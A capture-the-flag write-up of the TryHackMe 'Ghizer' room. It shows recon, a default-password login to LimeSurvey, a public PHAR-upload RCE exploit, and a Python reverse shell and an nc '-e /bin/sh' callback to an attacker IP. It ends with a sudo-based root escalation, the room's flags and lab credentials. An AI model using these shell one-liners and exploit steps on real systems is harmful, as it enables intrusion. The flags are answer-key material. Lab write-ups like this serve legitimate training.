<p align="center">April 22, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{351}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/a49b4992-58ab-4c43-a80d-913bba4b4c49" alt="Your Image Badge"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Ghizer}}$$</h1>
<p align="center"><em>lucrecia has installed multiple web applications on the server.</em>.<br>
It is classified as a medium-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/ghizerctf">here</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/6464e191-2db2-423a-a124-bf35a4be3e65"> </p>

<br>
<br>

<h2>Flag</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>What are the credentials you found in the configuration file? example: user:password</em><br><a id='1.1'></a>
>> <strong><code>Anny:P4$W0RD!!#S3CUr3!</code></strong><br>
<p></p>

<br>

<p>- Used <code>nmap</code> and discovered 6 ports open.<br>
-  What caught my eye was 80: LimeSurvey and 443:Wordpress.</p>

<br>

```bash
:~/Ghizer# nmap -sC -sV -Pn -p- TargetIP
...
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
|     Please login with USER and PASS.
|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp    open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: LimeSurvey http://www.limesurvey.org
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         LimeSurvey    
443/tcp   open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.4.2
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ghizer &#8211; Just another WordPress site
| ssl-cert: Subject: commonName=ubuntu
...
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
18002/tcp open  java-rmi   Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:42729
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
42729/tcp open  java-rmi   Java RMI
42823/tcp open  tcpwrapped
...
```

<br>

<p>-  Used <code>gobuster</code> against http://TargetIP.</p>

<br>

```bash

:~/Ghizer# gobuster dir -u http://TargetIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
...
/themes               (Status: 301) [Size: 315] [--> http://TargetIP/themes/]
/admin                (Status: 301) [Size: 314] [--> http://TargetIP/admin/]
/assets               (Status: 301) [Size: 315] [--> http://TargetIP/assets/]
/upload               (Status: 301) [Size: 315] [--> http://TargetIP/upload/]
/tests                (Status: 301) [Size: 314] [--> http://TargetIP/tests/]
/plugins              (Status: 301) [Size: 316] [--> http://TargetIP/plugins/]
/application          (Status: 301) [Size: 320] [--> http://TargetIP/application/]
/tmp                  (Status: 301) [Size: 312] [--> http://TargetIP/tmp/]
/framework            (Status: 301) [Size: 318] [--> http://TargetIP/framework/]
/locale               (Status: 301) [Size: 315] [--> http://TargetIP/locale/]
/installer            (Status: 301) [Size: 318] [--> http://TargetIP/installer/]
/docs                 (Status: 301) [Size: 313] [--> http://TargetIP/docs/]
/third_party          (Status: 301) [Size: 320] [--> http://TargetIP/third_party/]
/server-status        (Status: 403) [Size: 278]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```

<br>
<br>


<p>-  Used <code>dirsearch</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/796e4f19-3993-4a22-8392-39bf36dc82a1)

<br>


<p>-  Googled to understand what is LimeSurvey.</p>

<br>

![image](https://github.com/user-attachments/assets/a4bbe530-88bf-4257-adf9-29c8c873033d)

<br>

<p>- Researched for default credentials for LimeSurvey´s admin.<br>
 -  Guess what? admin :password.</p>

 <br>

 ![image](https://github.com/user-attachments/assets/976e48fd-b8c9-4acd-b3d7-23172adde165)

 <br>

<p>-  Navigated to http://TargetIP/admin and was redirected to http://TargetIP/index.php/admin/authentication/sa/login.</p>


<br>

![image](https://github.com/user-attachments/assets/48f7ec47-d964-4604-ba0b-ef036c9f8fa8)

<br>

<p>- Entered the credentials just discovered.<br>
 -  Clicked Login.<br>
 -  Noticed a warning in the upper right corner:<br>
Warning: You are still using the default password ('password'). Please change your password and re-login again.<br>
 -  Identified version 3.15.9.</p>


<br>

![image](https://github.com/user-attachments/assets/189b7473-c3ed-4328-a1f1-1c28de07834d)

<br>

<p>-  Used searchsploit  to locate a LimeSurvey RCE exploit.<br>
 -  Discovered 50573.py. Copied, ran it and it did not work.<br>
-  Used searchploit again and discovered 46634.py.</p>

<br>

![image](https://github.com/user-attachments/assets/b0f6c2d5-5b5f-48f1-882d-2aafec971ae3)

<br>

<p>- Got the shell and estabilized it.</p>

<br>

![image](https://github.com/user-attachments/assets/105bfab7-133f-490e-b006-1425f67ec672)

<br>

<p>-  Identified config.php.<br>
 -  Visualized its content.</p>

 <br>

 ![image](https://github.com/user-attachments/assets/d870089a-eb01-487d-987a-31216dd6fac3)


<br>

 
> 1.2. <em>What is the login path for the wordpress installation?d</em><br><a id='1.2'></a>
>> <strong><code>/?devtools</code></strong><br>
<p></p>

<br>

<p>Navigated to https://TargetIP<br><br>
It is about <code>Wordpress</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/fc5ccdad-7030-4d44-8d56-3a51e0f83072)

<br>


![image](https://github.com/user-attachments/assets/78a674ad-c707-4c1b-9ba0-d09e3c539c8e)

<br>

<p>Used <code>Anny</code>´s credentials to login.</p>

<br>

![image](https://github.com/user-attachments/assets/a5215a6e-6fa3-4d06-a8bf-1017d9a3df5b)


<br>

<p>The emial is correct.</p>

<br>

![image](https://github.com/user-attachments/assets/d861c073-87b2-49bb-ba46-9d27eaae0dd8)

<br>

![image](https://github.com/user-attachments/assets/4af21cb2-f3a6-4400-ad10-7bd168921699)

<br>

![image](https://github.com/user-attachments/assets/65b34af4-9bdb-4480-8c18-e20a361245a6)

<br>

![image](https://github.com/user-attachments/assets/e432d120-6ac8-4d60-9fb1-7345417cadc9)

<br>

![image](https://github.com/user-attachments/assets/fbda7f7f-bade-4138-a235-179cd6c0d9a2)



```bash
:~/Ghidra# ls
46634.py
:~/Ghidra# python 46634.py http://TargetIP admin password
[*] Logging in to LimeSurvey...
[*] Creating a new Survey...
[+] SurveyID: 595385
[*] Uploading a malicious PHAR...
[*] Sending the Payload...
[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/595385/files/malicious.jpg
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("AttackIP",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<br>

```bash
:~/Ghidra# nc -lvnp 1337
www-data@ubuntu:/var/www/html/limesurvey$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null                         
www-data@ubuntu:/var/www/html/limesurvey$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
www-data@ubuntu:/home/veronica$ netstat -ntpl
...
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
...
tcp        0      0 127.0.0.1:18001         0.0.0.0:*               LISTEN      -               
...
```

<br><br>

> 1.3. <em>Compromise the machine and locate user.txt</em><br><a id='1.3'></a>
>> <strong><code>THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}</code></strong><br>
<p></p>

<br>

```bash
www-data@ubuntu:/home/veronica$ jdb -attach localhost:18001
jdb -attach localhost:18001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> classpath
classpath
base directory: /home/veronica
classpath: [/home/veronica/ghidra_9.0/support/../Ghidra/Framework/Utility/lib/Utility.jar]
> classes
classes
** classes list **
...
util.HistoryList
util.demangler.GenericDemangledDataType
util.demangler.GenericDemangledType
utilities.util.FileUtilities
utilities.util.FileUtilities$$Lambda$88.1642030774
utilities.util.FileUtilities$$Lambda$89.411506101
utilities.util.reflection.ReflectionUtilities
utilities.util.reflection.ReflectionUtilities$$Lambda$259.162663528
utility.applicaiton.ApplicationLayout
utility.applicaiton.ApplicationSettings
utility.applicaiton.ApplicationUtilities
utility.module.ModuleManifestFile
utility.module.ModuleUtilities
utility.module.ModuleUtilities$$Lambda$87.2128029086
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
> 
Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0

Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc AttackIP 6666 -e /bin/sh")
print new java.lang.Runtime().exec("nc AttackIP 6666 -e /bin/sh")
 new java.lang.Runtime().exec("nc AttackIP 6666 -e /bin/sh") = "Process[pid=11770, exitValue="not exited"]"
Log4j2-TF-4-Scheduled-1[1] 
```

<br>

```bash
~/Ghidra# nc -lnvp 6666
...
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
veronica@ubuntu:~$ ls
ls
base.py  Documents  examples.desktop  Music     Public       Templates  Videos
Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
veronica@ubuntu:~$ cat user.txt
cat user.txt
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
```

<br>

> 1.4. <em>Escalate privileges and obtain root.txt</em><br><a id='1.4'></a>
>> <strong><code>THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}</code></strong><br>
<p></p>

<br>

```bash
veronica@ubuntu:~$ cat /var/www/html/limesurvey/application/config/config.php
cat /var/www/html/limesurvey/application/config/config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
	'components' => array(
		'db' => array(
			'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
			'emulatePrepare' => true,
			'username' => 'Anny',
			'password' => 'P4$W0RD!!#S3CUr3!',
			'charset' => 'utf8mb4',
			'tablePrefix' => 'lime_',
		),
		
		// Uncomment the following lines if you need table-based sessions.
		// Note: Table-based sessions are currently not supported on MSSQL server.
		// 'session' => array (
			// 'class' => 'application.core.web.DbHttpSession',
			// 'connectionID' => 'db',
			// 'sessionTableName' => '{{sessions}}',
		// ),
		
		'urlManager' => array(
			'urlFormat' => 'path',
			'rules' => array(
				// You can add your own rules here
			),
			'showScriptName' => true,
		),
	
	),
	// For security issue : it's better to set runtimePath out of web access
	// Directory must be readable and writable by the webuser
	// 'runtimePath'=>'/var/limesurvey/runtime/'
	// Use the following config variable to set modified optional settings copied from config-defaults.php
	'config'=>array(
	// debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
	// then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
	// on your webspace.
	// LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
		'debug'=>0,
		'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
		// Update default LimeSurvey config here
	)
);
/* End of file config.php */
/* Location: ./application/config/config.php */veronica@ubuntu:~$ cat base.py
cat base.py
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)

veronica@ubuntu:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /root/Lucrecia && bash lucre.sh
#
veronica@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
veronica@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > base.py
echo 'import pty;pty.spawn("/bin/bash")' > base.py
bash: base.py: Permission denied
veronica@ubuntu:~$ rm base.py
rm base.py
rm: remove write-protected regular file 'base.py'? yes
yes
veronica@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > base.py
echo 'import pty;pty.spawn("/bin/bash")' > base.py
veronica@ubuntu:~$ cat base.py
cat base.py
import pty;pty.spawn("/bin/bash")
veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
sudo /usr/bin/python3.5 /home/veronica/base.py
root@ubuntu:~# ls
ls
base.py  Documents  examples.desktop  Music     Public       Templates  Videos
Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
root@ubuntu:~# pwd
pwd
/home/veronica
root@ubuntu:/# cd /root
cd root
root@ubuntu:/root# ls
ls
Lucrecia  root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
root@ubuntu:/root# 
```



<br>
<br>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="900px" src="https://github.com/user-attachments/assets/94bced15-037c-4fbe-a885-f626368f3fef"><br>
<img width="900px" src="https://github.com/user-attachments/assets/8326b483-bb5c-4759-8d7f-da3b9814b38a"></p>

<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| April 22, 2025    | 351      |     268ᵗʰ    |      6ᵗʰ     |     50ᵗʰ    |     2ⁿᵈ    |  96,169  |    675    |     59    |

</div>

<br>

<p align="center"> Global All Time: 268ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/a21c7353-56c8-4a66-9320-dab6a907aa2b"> </p>

<p align="center"> Brazil All Time:   6ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/e4222ff9-d737-43ef-80b1-e25dcf369e31"> </p>

<p align="center"> Global monthly:    50ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/78271b69-e229-4d35-ab13-828b894bce04"> </p>

<p align="center"> Brazil monthly:    2ⁿᵈ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/9d72054e-0865-4d75-8ef4-ef54d2cec615"> </p>

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/stuxnet">stuxnet</a> for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
